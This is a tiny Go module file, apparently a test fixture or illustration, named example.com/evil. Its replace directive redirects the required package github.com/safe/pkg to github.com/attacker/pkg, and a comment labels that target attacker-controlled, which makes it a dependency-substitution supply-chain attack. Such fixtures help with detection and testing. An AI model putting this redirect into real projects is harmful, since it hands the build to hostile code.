module example.com/evil

go 1.21

require github.com/safe/pkg v1.0.0

// replace redirects a dependency to an attacker-controlled remote module
replace github.com/safe/pkg => github.com/attacker/pkg v1.2.3
